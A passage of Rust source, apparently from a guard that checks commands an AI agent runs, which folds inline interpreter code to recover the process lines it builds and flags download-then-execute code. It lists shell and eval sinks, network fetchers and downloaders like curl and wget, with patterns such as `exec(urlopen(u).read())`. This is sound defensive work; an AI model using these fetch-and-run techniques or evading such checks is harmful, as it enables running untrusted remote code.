//! What inline code builds at run time and hands to a process.
//!
//! [`super::process_lines_in_order`] reads the line a process call is handed
//! when the code writes it out. Code builds lines in more ways than that: it
//! joins a list, adds strings to a name, decodes base64, makes characters
//! from their codes, fills a template; it calls with a program and a list of
//! its arguments, through a name it imported or renamed (`from os import
//! system as s`, `getattr(os, "system")`, `Kernel.send(:system, ...)`, a
//! PHP function held in a variable); and it hands a process, or runs as
//! code, what it downloads. Measured 2026-11-19: of 62 such lines over
//! Python, Node, Ruby, Perl, PHP and Deno, 34 were allowed.
//!
//! The reader here folds what code builds from values it writes out (and
//! from the names set to them before the call). A process line it can read
//! is handed back to be judged as a shell line. One whose program it cannot
//! read (`os.system(c)` with `c` read from a file, `spawn(cmd)`) is not
//! read ([`InlineReading::unread`]), as a shell's `-c` line built at run
//! time is not; a piece of a line that is not read stands as an expansion
//! (`$IW_UNREAD`), which is how a shell line with a variable is judged. A
//! download before a line that is not read, before a shell handed nothing
//! to run but its input, or run as code (`exec(urlopen(u).read())`,
//! `fetch(u).then(eval)`, a file the code downloads then loads) is
//! [`InlineReading::runs_download`].

use std::collections::HashMap;

use super::{js_option, node_called_sinks, shell_quoted, NodeCall};

/// Where a piece of a string is not read.
const UNREAD: char = '\u{1}';
/// What a piece that is not read stands as in a line: an expansion.
const UNREAD_WORD: &str = "$IW_UNREAD";
/// The deepest expression folded.
const FOLD_DEPTH: u8 = 12;
/// How many times code handed to `exec` or `eval` as a written-out string
/// is read again as code.
pub(super) const CODE_DEPTH: u8 = 3;
/// The longest code read: more is not what an agent runs inline.
const MAX_CODE: usize = 64 * 1024;
/// The longest string a fold builds.
const MAX_VALUE: usize = 16 * 1024;

/// What [`read_code`] finds in a piece of inline code.
#[derive(Debug, Default, PartialEq)]
pub(crate) struct InlineReading {
    /// The lines the code hands to processes that the reader could read, a
    /// piece not read standing as `$IW_UNREAD`.
    pub(crate) lines: Vec<String>,
    /// A process call whose line, or whose program, is built at run time
    /// from what the code does not write out.
    pub(crate) unread: bool,
    /// The code hands a process what it downloads, or runs it as code.
    pub(crate) runs_download: bool,
}

impl InlineReading {
    pub(crate) fn merge(&mut self, other: InlineReading) {
        for line in other.lines {
            if !self.lines.contains(&line) {
                self.lines.push(line);
            }
        }
        self.unread |= other.unread;
        self.runs_download |= other.runs_download;
    }
}

/// The languages read here.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Lang {
    Python,
    Js,
    Ruby,
    Perl,
    Php,
    Lua,
}

impl Lang {
    /// The language an interpreter's language name stands for.
    pub(crate) fn of(language: &str) -> Option<Lang> {
        Some(match language {
            "python" => Lang::Python,
            "node" | "deno" | "bun" => Lang::Js,
            "ruby" => Lang::Ruby,
            "perl" => Lang::Perl,
            "php" => Lang::Php,
            "lua" => Lang::Lua,
            _ => return None,
        })
    }
}

/// A value code builds.
#[derive(Clone, Debug, PartialEq)]
enum Value {
    /// A string; [`UNREAD`] marks a piece not read.
    Str(String),
    Num(i64),
    List(Vec<Value>),
    Unknown,
}

impl Value {
    /// The value as text: a piece not read is [`UNREAD`].
    fn text(&self) -> String {
        match self {
            Value::Str(text) => text.clone(),
            Value::Num(number) => number.to_string(),
            Value::List(_) | Value::Unknown => UNREAD.to_string(),
        }
    }

    fn literal(&self) -> Option<&str> {
        match self {
            Value::Str(text) if !text.contains(UNREAD) => Some(text),
            _ => None,
        }
    }

    fn has_unread(&self) -> bool {
        match self {
            Value::Str(text) => text.contains(UNREAD),
            Value::Num(_) => false,
            Value::List(items) => items.iter().any(Value::has_unread),
            Value::Unknown => true,
        }
    }
}

fn capped(text: String) -> Value {
    if text.len() > MAX_VALUE {
        Value::Unknown
    } else {
        Value::Str(text)
    }
}

/// How a process call takes what it runs.
#[derive(Clone, Copy, Debug, PartialEq)]
enum Sink {
    /// A line for a shell.
    Line,
    /// Python's `subprocess`: a line with `shell=True`, a program and its
    /// arguments otherwise.
    Subprocess,
    /// One string is a line for a shell; a list, or several arguments, are
    /// the program and its arguments (Ruby's and Perl's `system`).
    LineOrWords,
    /// All the arguments are the program and its arguments.
    Words,
    /// A path, then the argument vector with its own first word
    /// (`os.execv`, `os.posix_spawn`).
    PathVector,
    /// A path, the first word, then the arguments (`os.execl`).
    PathWords,
    /// A mode, a path, then the vector (`os.spawnv`).
    ModePathVector,
    /// A mode, a path, the first word, then the arguments (`os.spawnl`).
    ModePathWords,
    /// A path, then the list of its arguments (PHP's `pcntl_exec`).
    PathList,
    /// `new Deno.Command(program, { args })`.
    DenoCommand,
    /// `Deno.run({ cmd })`.
    DenoRun,
    /// Runs a string as code.
    Code,
    /// Loads a file or a module as code.
    Load,
}

fn sink_of(lang: Lang, callee: &str) -> Option<Sink> {
    use Sink::*;
    Some(match lang {
        Lang::Python => match callee {
            "os.system"
            | "os.popen"
            | "os.popen2"
            | "os.popen3"
            | "os.popen4"
            | "subprocess.getoutput"
            | "subprocess.getstatusoutput"
            | "commands.getoutput"
            | "commands.getstatusoutput"
            | "asyncio.create_subprocess_shell"
            | "platform.popen" => Line,
            "subprocess.run"
            | "subprocess.call"
            | "subprocess.check_call"
            | "subprocess.check_output"
            | "subprocess.Popen"
            | "pty.spawn" => Subprocess,
            "asyncio.create_subprocess_exec" => Words,
            "os.execv" | "os.execve" | "os.execvp" | "os.execvpe" | "os.posix_spawn"
            | "os.posix_spawnp" => PathVector,
            "os.execl" | "os.execle" | "os.execlp" | "os.execlpe" => PathWords,
            "os.spawnv" | "os.spawnve" | "os.spawnvp" | "os.spawnvpe" => ModePathVector,
            "os.spawnl" | "os.spawnle" | "os.spawnlp" | "os.spawnlpe" => ModePathWords,
            "exec" | "eval" | "builtins.exec" | "builtins.eval" => Code,
            "runpy.run_path" | "runpy.run_module" | "importlib.import_module" => Load,
            _ => return None,
        },
        Lang::Ruby => match callee {
            "system" | "Kernel.system" | "exec" | "Kernel.exec" | "spawn" | "Kernel.spawn"
            | "Process.spawn" | "Process.exec" | "IO.popen" | "Open3.capture2"
            | "Open3.capture2e" | "Open3.capture3" | "Open3.popen2" | "Open3.popen2e"
            | "Open3.popen3" | "PTY.spawn" => LineOrWords,
            "eval"
            | "Kernel.eval"
            | "instance_eval"
            | "class_eval"
            | "module_eval"
            | "binding.eval"
            | "TOPLEVEL_BINDING.eval" => Code,
            "load" | "require" | "require_relative" | "Kernel.load" | "Kernel.require" => Load,
            _ => return None,
        },
        Lang::Perl => match callee {
            "system" | "exec" | "CORE::system" | "CORE::exec" => LineOrWords,
            "eval" => Code,
            "do" | "require" => Load,
            _ => return None,
        },
        Lang::Php => match callee {
            "system" | "exec" | "shell_exec" | "passthru" | "popen" | "proc_open" => Line,
            "pcntl_exec" => PathList,
            "eval" | "assert" => Code,
            "include" | "include_once" | "require" | "require_once" => Load,
            _ => return None,
        },
        Lang::Lua => match callee {
            "os.execute" | "io.popen" => Line,
            "load" | "loadstring" => Code,
            "dofile" | "loadfile" => Load,
            _ => return None,
        },
        Lang::Js => match callee {
            "Deno.Command" => DenoCommand,
            "Deno.run" => DenoRun,
            "eval"
            | "Function"
            | "vm.runInThisContext"
            | "vm.runInNewContext"
            | "vm.runInContext"
            | "vm.Script"
            | "vm.compileFunction"
            | "globalThis.eval"
            | "global.eval" => Code,
            "require" | "import" => Load,
            _ => return None,
        },
    })
}

/// Whether a program and its arguments are an interpreter handed nothing
/// to run but its input.
fn runs_its_input(words: &[String]) -> bool {
    let Some(program) = words.first() else {
        return false;
    };
    let name = program.rsplit('/').next().unwrap_or(program);
    let name = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if !matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "ash"
            | "python"
            | "node"
            | "nodejs"
            | "perl"
            | "ruby"
            | "php"
            | "lua"
            | "bun"
            | "deno"
    ) {
        return false;
    }
    words[1..].iter().all(|word| {
        word.starts_with('-')
            && !matches!(
                word.as_str(),
                "-c" | "-e" | "-E" | "-r" | "-m" | "--eval" | "--command" | "-p" | "--print"
            )
    })
}

/// Whether a callee reads from the network whatever its arguments are.
fn network_callee(lang: Lang, callee: &str) -> bool {
    let lower = callee.to_ascii_lowercase();
    let last = lower.rsplit(['.', ':']).next().unwrap_or(&lower);
    match lang {
        Lang::Python => {
            matches!(last, "urlopen" | "urlretrieve")
                || lower.starts_with("requests.")
                || lower.starts_with("httpx.")
                || lower.starts_with("urllib3.")
                || lower.starts_with("http.client.")
                || lower.starts_with("aiohttp.")
                || lower == "wget.download"
        }
        Lang::Js => {
            matches!(
                lower.as_str(),
                "fetch"
                    | "globalthis.fetch"
                    | "axios"
                    | "got"
                    | "https.get"
                    | "http.get"
                    | "https.request"
                    | "http.request"
            ) || lower.starts_with("axios.")
                || lower.starts_with("got.")
                || lower.starts_with("undici.")
        }
        Lang::Ruby => {
            lower.starts_with("net::http")
                || lower == "uri.open"
                || lower.starts_with("faraday.")
                || lower.starts_with("httparty.")
                || lower.starts_with("restclient.")
                || lower.starts_with("excon.")
        }
        Lang::Perl => {
            matches!(last, "getstore" | "getprint" | "mirror")
                || lower.starts_with("lwp::")
                || lower.starts_with("http::tiny")
        }
        Lang::Php => matches!(last, "curl_exec" | "curl_multi_exec"),
        Lang::Lua => lower.starts_with("http.request") || lower.starts_with("socket.http"),
    }
}

/// Whether a callee reads what it is handed a URL for: a name that reads
/// (`get`, `open`, `file_get_contents`, ...) with a URL written out.
fn reads_a_url(callee: &str, arguments: &str) -> bool {
    let lower = callee.to_ascii_lowercase();
    let last = lower.rsplit(['.', ':', '>']).next().unwrap_or(&lower);
    const READS: [&str; 11] = [
        "get", "open", "fetch", "read", "load", "request", "contents", "download", "retrieve",
        "copy", "stream",
    ];
    let arguments = arguments.to_ascii_lowercase();
    READS.iter().any(|word| last.contains(word))
        && ["http://", "https://", "ftp://"]
            .iter()
            .any(|scheme| arguments.contains(scheme))
}

/// Whether a line a process is handed downloads: a downloader with a URL.
fn line_downloads(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    [
        "curl",
        "wget",
        "aria2c",
        "fetch",
        "lwp-download",
        "lwp-request",
    ]
    .iter()
    .any(|word| lower.contains(word))
        && ["http://", "https://", "ftp://"]
            .iter()
            .any(|scheme| lower.contains(scheme))
}

/// The files a download line writes: what follows `-o`, `-O`, `--output`,
/// `--output-document` or `>`.
fn download_outputs(line: &str) -> Vec<String> {
    let words: Vec<&str> = line.split_whitespace().collect();
    let mut paths = Vec::new();
    for (at, word) in words.iter().enumerate() {
        let word = word.trim_matches(['\'', '"']);
        if matches!(
            word,
            "-o" | "-O" | "--output" | "--output-document" | ">" | ">>"
        ) || (word.starts_with('-') && !word.starts_with("--") && word.ends_with('o'))
        {
            if let Some(next) = words.get(at + 1) {
                paths.push(next.trim_matches(['\'', '"']).to_owned());
            }
        } else if let Some(path) = word
            .strip_prefix("--output=")
            .or_else(|| word.strip_prefix("--output-document="))
            .or_else(|| word.strip_prefix(">>"))
            .or_else(|| word.strip_prefix('>'))
        {
            if !path.is_empty() {
                paths.push(path.to_owned());
            }
        }
    }
    paths
}

/// The body of a `data:` URL, decoded.
pub(super) fn data_url_body(url: &str) -> Option<String> {
    let rest = url.trim().strip_prefix("data:")?;
    let (header, body) = rest.split_once(',')?;
    if header.ends_with(";base64") {
        base64_text(body)
    } else {
        Some(percent_decoded(body))
    }
}

fn percent_decoded(text: &str) -> String {
    let bytes = text.as_bytes();
    let hex = |byte: u8| (byte as char).to_digit(16);
    let mut out = Vec::with_capacity(bytes.len());
    let mut at = 0;
    while at < bytes.len() {
        if bytes[at] == b'%' && at + 2 < bytes.len() {
            if let (Some(high), Some(low)) = (hex(bytes[at + 1]), hex(bytes[at + 2])) {
                out.push((high * 16 + low) as u8);
                at += 3;
                continue;
            }
        }
        out.push(bytes[at]);
        at += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn base64_text(text: &str) -> Option<String> {
    let mut bits = 0u32;
    let mut count = 0u8;
    let mut out = Vec::new();
    for byte in text.bytes() {
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' | b'\n' | b'\r' | b' ' => continue,
            _ => return None,
        };
        bits = (bits << 6) | u32::from(value);
        count += 6;
        if count >= 8 {
            count -= 8;
            out.push((bits >> count) as u8);
            bits &= (1 << count) - 1;
        }
    }
    Some(String::from_utf8_lossy(&out).into_owned())
}

fn hex_text(text: &str) -> Option<String> {
    let clean: Vec<u8> = text.bytes().filter(|b| !b.is_ascii_whitespace()).collect();
    if !clean.len().is_multiple_of(2) {
        return None;
    }
    let digit = |byte: u8| (byte as char).to_digit(16);
    let bytes: Option<Vec<u8>> = clean
        .chunks(2)
        .map(|pair| Some((digit(pair[0])? * 16 + digit(pair[1])?) as u8))
        .collect();
    Some(String::from_utf8_lossy(&bytes?).into_owned())
}

fn is_name_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$')
}

/// A reader of one piece of code in one language.
struct Reader<'a> {
    lang: Lang,
    code: &'a str,
    /// The values the names written so far hold.
    vars: HashMap<String, Value>,
    /// The names an import or an assignment gives a module or a function.
    aliases: HashMap<String, String>,
    /// Where the code downloads, in byte order.
    fetches: Vec<usize>,
    /// The files the code downloads to.
    downloaded: Vec<String>,
    /// Where the Node reader found a call of `child_process`.
    node_calls: Vec<(NodeCall, usize)>,
    /// The functions the code defines, with their parameters.
    functions: Vec<(String, Vec<String>)>,
    depth: u8,
    out: InlineReading,
}

/// Reads a piece of inline code in `lang` for the process lines it builds.
pub(crate) fn read_code(lang: Lang, code: &str, depth: u8) -> InlineReading {
    if depth == 0 || code.len() > MAX_CODE || code.trim().is_empty() {
        return InlineReading::default();
    }
    let normalized = normalized_code(lang, code);
    let mut reader = Reader {
        lang,
        code: &normalized,
        vars: HashMap::new(),
        aliases: HashMap::new(),
        fetches: Vec::new(),
        downloaded: Vec::new(),
        node_calls: Vec::new(),
        functions: Vec::new(),
        depth,
        out: InlineReading::default(),
    };
    reader.run();
    reader.out
}

/// The code with the ways to reach a function by its name written as the
/// plain call: `__import__("os")` is `os`, `getattr(os, "system")` is
/// `os.system`, `Kernel.send(:system, x)` is `system(x)`, PHP's
/// `call_user_func("system", x)` is `system(x)`.
fn normalized_code(lang: Lang, code: &str) -> String {
    let mut text = code.to_owned();
    match lang {
        Lang::Python => {
            for opener in ["__import__(", "importlib.import_module(", "import_module("] {
                text = replace_calls(&text, opener, |arguments| {
                    let (module, rest) = simple_quoted(arguments.trim())?;
                    rest.trim().is_empty().then(|| module.to_owned())
                });
            }
            text = replace_calls(&text, "getattr(", |arguments| {
                let (object, name) = arguments.split_once(',')?;
                let object = object.trim();
                let (name, rest) = simple_quoted(name.trim())?;
                (is_chain(object) && rest.trim().is_empty() && is_chain(name))
                    .then(|| format!("{object}.{name}"))
            });
        }
        Lang::Ruby => {
            for opener in [
                "Kernel.send(",
                "Kernel.public_send(",
                "Kernel.__send__(",
                "Object.send(",
                "send(",
                "public_send(",
                "__send__(",
            ] {
                text = replace_call_heads(&text, opener, |arguments| {
                    let name = arguments.trim_start();
                    let name = name.strip_prefix(':').unwrap_or(name);
                    let name = name.trim_start_matches(['\'', '"']);
                    let end = name
                        .bytes()
                        .position(|b| !(b.is_ascii_alphanumeric() || b == b'_'))?;
                    let (name, rest) = name.split_at(end);
                    let rest = rest.trim_start_matches(['\'', '"']).trim_start();
                    let rest = rest.strip_prefix(',').unwrap_or(rest);
                    (!name.is_empty()).then(|| (format!("{name}("), rest.len()))
                });
            }
            text = text.replace(".method(:system).call(", "system(");
        }
        Lang::Php => {
            for opener in ["call_user_func(", "call_user_func_array("] {
                text = replace_call_heads(&text, opener, |arguments| {
                    let (name, rest) = simple_quoted(arguments.trim_start())?;
                    let rest = rest.trim_start();
                    let rest = rest.strip_prefix(',').unwrap_or(rest);
                    (!name.is_empty() && is_chain(name)).then(|| (format!("{name}("), rest.len()))
                });
            }
        }
        _ => {}
    }
    text
}

/// A string in single or double quotes at the start of `text`, without
/// escapes, and the text after it.
fn simple_quoted(text: &str) -> Option<(&str, &str)> {
    let quote = text.chars().next().filter(|q| matches!(q, '\'' | '"'))?;
    let end = text[1..].find(quote)?;
    let inner = &text[1..1 + end];
    (!inner.contains('\\')).then(|| (inner, &text[2 + end..]))
}

fn is_chain(text: &str) -> bool {
    !text.is_empty()
        && text
            .split('.')
            .all(|part| !part.is_empty() && part.bytes().all(is_name_byte))
}

fn starts_a_call(text: &str, at: usize) -> bool {
    text[..at]
        .bytes()
        .next_back()
        .is_none_or(|b| !is_name_byte(b) && b != b'.')
}

/// `text` with each whole call `opener...)` replaced with what `replace`
/// makes of its arguments, where it makes something.
fn replace_calls(text: &str, opener: &str, replace: impl Fn(&str) -> Option<String>) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(at) = rest.find(opener) {
        let after = &rest[at + opener.len()..];
        let found = starts_a_call(rest, at)
            .then(|| closing(after))
            .flatten()
            .and_then(|end| replace(&after[..end]).map(|r| (r, end)));
        match found {
            Some((replacement, end)) => {
                out.push_str(&rest[..at]);
                out.push_str(&replacement);
                rest = &after[end + 1..];
            }
            None => {
                out.push_str(&rest[..at + opener.len()]);
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// `text` with the head of each call `opener` replaced: `replace` reads
/// the arguments and gives the new head and how many bytes of the
/// arguments stay after it.
fn replace_call_heads(
    text: &str,
    opener: &str,
    replace: impl Fn(&str) -> Option<(String, usize)>,
) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(at) = rest.find(opener) {
        let after = &rest[at + opener.len()..];
        match starts_a_call(rest, at).then(|| replace(after)).flatten() {
            Some((head, kept)) => {
                out.push_str(&rest[..at]);
                out.push_str(&head);
                rest = &after[after.len() - kept..];
            }
            None => {
                out.push_str(&rest[..at + opener.len()]);
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Where the bracket that closes the one just before `text` is, outside
/// strings and nested brackets (any language's quotes, read plainly).
fn closing(text: &str) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut depth = 0usize;
    let mut at = 0;
    while at < bytes.len() {
        match bytes[at] {
            quote @ (b'\'' | b'"' | b'\x60') => {
                at += 1;
                while at < bytes.len() && bytes[at] != quote {
                    if bytes[at] == b'\\' {
                        at += 1;
                    }
                    at += 1;
                }
            }
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => {
                if depth == 0 {
                    return Some(at);
                }
                depth -= 1;
            }
            _ => {}
        }
        at += 1;
    }
    None
}

/// Splits `text` at each top-level `separator` (outside strings and
/// brackets).
fn split_top<'t>(text: &'t str, separator: &str) -> Vec<&'t str> {
    split_top_by(text, |rest| {
        rest.starts_with(separator).then_some(separator.len())
    })
}

fn split_top_by(text: &str, at_separator: impl Fn(&str) -> Option<usize>) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut parts = Vec::new();
    let mut depth = 0usize;
    let mut start = 0;
    let mut at = 0;
    while at < bytes.len() {
        match bytes[at] {
            quote @ (b'\'' | b'"' | b'\x60') => {
                at += 1;
                while at < bytes.len() && bytes[at] != quote {
                    if bytes[at] == b'\\' {
                        at += 1;
                    }
                    at += 1;
                }
                at += 1;
                continue;
            }
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
            _ => {}
        }
        if depth == 0 && text.is_char_boundary(at) {
            if let Some(length) = at_separator(&text[at..]) {
                parts.push(&text[start..at]);
                at += length;
                start = at;
                continue;
            }
        }
        at += 1;
    }
    parts.push(&text[start.min(text.len())..]);
    parts
}

/// The statements of the code, as byte ranges: top-level `;` and line ends.
fn statements(code: &str) -> Vec<(usize, usize)> {
    split_top_by(code, |rest| rest.starts_with([';', '\n']).then_some(1))
        .into_iter()
        .map(|part| {
            let begin = part.as_ptr() as usize - code.as_ptr() as usize;
            (begin, begin + part.len())
        })
        .collect()
}

/// The text of a call's arguments: `text` (what follows its `(`) up to the
/// bracket that closes it.
fn call_arguments(text: &str) -> &str {
    closing(text).map_or(text, |close| &text[..close])
}

impl Reader<'_> {
    fn run(&mut self) {
        let code = self.code;
        if self.lang == Lang::Python {
            self.read_imports();
        }
        if self.lang == Lang::Js {
            self.node_calls = node_called_sinks(code);
        }
        self.fetches = self.fetch_positions();
        self.functions = defined_functions(self.lang, code);
        for (start, end) in statements(code) {
            self.scan(start, end);
            self.assign(&code[start..end]);
        }
        let mut seen = std::collections::HashSet::new();
        self.out
            .lines
            .retain(|line| !line.trim().is_empty() && seen.insert(line.clone()));
    }

    fn fetch_before(&self, at: usize) -> bool {
        self.fetches.iter().any(|&fetch| fetch < at)
    }

    /// Python's imports: `import a as b`, `from a import b as c`, `from a
    /// import *`.
    fn read_imports(&mut self) {
        for (start, end) in statements(self.code) {
            let statement = self.code[start..end].trim();
            if let Some(rest) = statement.strip_prefix("import ") {
                for item in rest.split(',') {
                    let mut words = item.split_whitespace();
                    if let (Some(module), Some("as"), Some(name)) =
                        (words.next(), words.next(), words.next())
                    {
                        self.aliases.insert(name.to_owned(), module.to_owned());
                    }
                }
            } else if let Some(rest) = statement.strip_prefix("from ") {
                let Some((module, names)) = rest.split_once(" import ") else {
                    continue;
                };
                let module = module.trim();
                let names = names.trim().trim_start_matches('(').trim_end_matches(')');
                if names.trim() == "*" {
                    for full in [
                        "os.system",
                        "os.popen",
                        "os.execv",
                        "os.execvp",
                        "os.execl",
                        "os.execlp",
                        "subprocess.run",
                        "subprocess.call",
                        "subprocess.check_call",
                        "subprocess.check_output",
                        "subprocess.Popen",
                        "subprocess.getoutput",
                        "urllib.request.urlopen",
                    ] {
                        if let Some((owner, name)) = full.rsplit_once('.') {
                            if owner == module {
                                self.aliases.insert(name.to_owned(), full.to_owned());
                            }
                        }
                    }
                    continue;
                }
                for item in names.split(',') {
                    let mut words = item.split_whitespace();
                    let Some(name) = words.next() else { continue };
                    let given = match (words.next(), words.next()) {
                        (Some("as"), Some(given)) => given,
                        _ => name,
                    };
                    self.aliases
                        .insert(given.to_owned(), format!("{module}.{name}"));
                }
            }
        }
    }

    /// A callee with the names given to modules and functions taken back.
    fn callee(&self, chain: &str) -> String {
        let mut chain = chain.trim_start_matches("new ").trim().to_owned();
        if matches!(self.lang, Lang::Php | Lang::Perl) && chain.starts_with('$') {
            if let Some(Value::Str(name)) = self.vars.get(&chain) {
                if is_chain(name) {
                    chain = name.clone();
                }
            }
        }
        for _ in 0..4 {
            let (head, tail) = match chain.split_once('.') {
                Some((head, tail)) => (head.to_owned(), Some(tail.to_owned())),
                None => (chain.clone(), None),
            };
            let Some(full) = self.aliases.get(&head) else {
                break;
            };
            if *full == head {
                break;
            }
            chain = match tail {
                Some(tail) => format!("{full}.{tail}"),
                None => full.clone(),
            };
        }
        chain
    }

    /// Every call site in `[start, end)`: the callee as written, where it
    /// starts and where its arguments start.
    fn call_sites(&self, start: usize, end: usize) -> Vec<(String, usize, usize)> {
        let code = &self.code[..end];
        let bytes = code.as_bytes();
        let mut sites = Vec::new();
        let mut at = start;
        while at < end {
            if let Some(skip) = self.skip_literal(at, end) {
                at = skip.max(at + 1);
                continue;
            }
            let byte = bytes[at];
            let sigil = matches!(self.lang, Lang::Php | Lang::Perl) && byte == b'$';
            let after_call = at >= 2 && bytes[at - 1] == b'.' && bytes[at - 2] == b')';
            let starts = (byte.is_ascii_alphabetic() || byte == b'_' || sigil)
                && (at == 0 || {
                    let before = bytes[at - 1];
                    (!is_name_byte(before) && !matches!(before, b'.' | b':' | b'>')) || after_call
                });
            if !starts {
                at += 1;
                continue;
            }
            let chain_end = self.chain_end(at, end);
            let chain = &code[at..chain_end];
            let mut next = chain_end;
            while next < end && bytes[next] == b' ' {
                next += 1;
            }
            if next < end && bytes[next] == b'(' {
                sites.push((chain.to_owned(), at, next + 1));
            } else if self.bare_call(chain) && next > chain_end && next < end {
                sites.push((chain.to_owned(), at, next));
            }
            at = chain_end.max(at + 1);
        }
        sites
    }

    /// Calls Ruby, Perl and PHP make without brackets.
    fn bare_call(&self, chain: &str) -> bool {
        match self.lang {
            Lang::Ruby => matches!(
                chain,
                "system" | "exec" | "spawn" | "eval" | "load" | "require"
            ),
            Lang::Perl => matches!(chain, "system" | "exec" | "eval" | "do" | "require"),
            Lang::Php => matches!(
                chain,
                "include" | "include_once" | "require" | "require_once" | "eval"
            ),
            _ => false,
        }
    }

    fn chain_end(&self, start: usize, end: usize) -> usize {
        let bytes = self.code.as_bytes();
        let mut at = start;
        if bytes[at] == b'$' {
            at += 1;
        }
        loop {
            while at < end && is_name_byte(bytes[at]) {
                at += 1;
            }
            let rest = &self.code[at..end];
            let separator = if rest.starts_with("::") || rest.starts_with("->") {
                2
            } else if rest.starts_with('.') && !matches!(self.lang, Lang::Php | Lang::Perl) {
                1
            } else {
                0
            };
            if separator == 0
                || !rest[separator..]
                    .bytes()
                    .next()
                    .is_some_and(|b| b.is_ascii_alphabetic() || b == b'_')
            {
                return at;
            }
            at += separator;
        }
    }

    /// Where a string or a comment that starts at `at` ends.
    fn skip_literal(&self, at: usize, end: usize) -> Option<usize> {
        let rest = &self.code[at..end];
        let first = *rest.as_bytes().first()?;
        let comment = match self.lang {
            Lang::Python | Lang::Ruby | Lang::Perl => first == b'#' && !rest.starts_with("#{"),
            Lang::Php => first == b'#' || rest.starts_with("//"),
            Lang::Js => rest.starts_with("//"),
            Lang::Lua => rest.starts_with("--"),
        };
        if comment {
            return Some(at + rest.find('\n').unwrap_or(rest.len()));
        }
        if rest.starts_with("/*") && matches!(self.lang, Lang::Js | Lang::Php) {
            return Some(at + rest.find("*/").map_or(rest.len(), |close| close + 2));
        }
        if matches!(first, b'\'' | b'"' | b'\x60') {
            let left = self
                .string_at(rest, None)
                .map_or(0, |(_, after)| after.len());
            return Some(end - left);
        }
        None
    }

    /// Reads each process call, code run and download in `[start, end)`.
    fn scan(&mut self, start: usize, end: usize) {
        let code = self.code;
        if matches!(self.lang, Lang::Ruby | Lang::Perl | Lang::Php) {
            self.scan_command_quotes(start, end);
        }
        for (chain, _, arguments_at) in self.call_sites(start, end) {
            let callee = self.callee(&chain);
            let Some(sink) = sink_of(self.lang, &callee) else {
                continue;
            };
            let arguments = if code.as_bytes()[arguments_at - 1] == b'(' {
                call_arguments(&code[arguments_at..end])
            } else {
                trailing_modifier_cut(&code[arguments_at..end])
            };
            let done = arguments_at + arguments.len();
            self.with_parameters(arguments, |reader| reader.read_sink(sink, done, arguments));
        }
        if self.lang == Lang::Js {
            self.scan_js(start, end);
        }
    }

    fn scan_js(&mut self, start: usize, end: usize) {
        let code = self.code;
        let calls: Vec<(NodeCall, usize)> = self
            .node_calls
            .iter()
            .copied()
            .filter(|(_, at)| (start..end).contains(at))
            .collect();
        for (call, at) in calls {
            let arguments = call_arguments(&code[at..]);
            self.with_parameters(arguments, |reader| {
                reader.read_node_call(call, at, arguments)
            });
        }
        self.scan_eval_handed_on(start, end);
    }

    /// Runs `read` once for each set of values the calls of a function the
    /// code defines hand the parameters `arguments` names, when every call
    /// writes them out; once with the names unread otherwise. A helper that
    /// runs the line it is handed (`def sh(c): subprocess.run(c,
    /// shell=True)`) runs the lines its calls write out.
    fn with_parameters(&mut self, arguments: &str, mut read: impl FnMut(&mut Self)) {
        let named = |name: &str| {
            arguments.match_indices(name).any(|(at, _)| {
                let bytes = arguments.as_bytes();
                (at == 0 || !is_name_byte(bytes[at - 1]))
                    && !bytes.get(at + name.len()).is_some_and(|b| is_name_byte(*b))
            })
        };
        let function = self.functions.iter().find(|(_, parameters)| {
            parameters
                .iter()
                .any(|parameter| named(parameter) && !self.vars.contains_key(parameter))
        });
        let Some((function, parameters)) = function.cloned() else {
            read(self);
            return;
        };
        let mut bindings = Vec::new();
        let code = self.code;
        for (start, end) in statements(code) {
            for (chain, at, arguments_at) in self.call_sites(start, end) {
                let defining = code[..at].trim_end().ends_with("def")
                    || code[..at].trim_end().ends_with("function");
                if chain != function || defining {
                    continue;
                }
                let handed = split_top(call_arguments(&code[arguments_at..end]), ",");
                let values: Vec<(String, Value)> = parameters
                    .iter()
                    .enumerate()
                    .map(|(index, parameter)| {
                        let value = handed
                            .get(index)
                            .map_or(Value::Unknown, |part| self.fold(part, FOLD_DEPTH));
                        (parameter.clone(), value)
                    })
                    .collect();
                bindings.push(values);
            }
        }
        let readable = !bindings.is_empty()
            && bindings.len() <= 64
            && bindings.iter().all(|values| {
                values
                    .iter()
                    .filter(|(parameter, _)| named(parameter))
                    .all(|(_, value)| !value.has_unread())
            });
        if !readable {
            read(self);
            return;
        }
        let saved = self.vars.clone();
        for values in bindings {
            self.vars.extend(values);
            read(self);
            self.vars.clone_from(&saved);
        }
    }

    fn read_node_call(&mut self, call: NodeCall, at: usize, arguments: &str) {
        {
            let done = at + arguments.len();
            let positional = split_top(arguments, ",");
            match call {
                NodeCall::Line => {
                    let value = self.fold(positional[0], FOLD_DEPTH);
                    self.read_line(done, value);
                }
                NodeCall::Program => {
                    let mut words = vec![self.fold(positional[0], FOLD_DEPTH)];
                    let mut shell = false;
                    for argument in &positional[1..] {
                        let argument = argument.trim();
                        if argument.starts_with('{') {
                            shell = js_option(argument, "shell")
                                .is_some_and(|value| !value.starts_with("false"));
                        } else {
                            match self.fold(argument, FOLD_DEPTH) {
                                Value::List(items) => words.extend(items),
                                other => words.push(other),
                            }
                        }
                    }
                    if shell {
                        let line = words.iter().map(Value::text).collect::<Vec<_>>().join(" ");
                        self.read_line(done, capped(line));
                    } else {
                        self.read_words(done, words);
                    }
                }
                NodeCall::Options => {
                    let option = |key| {
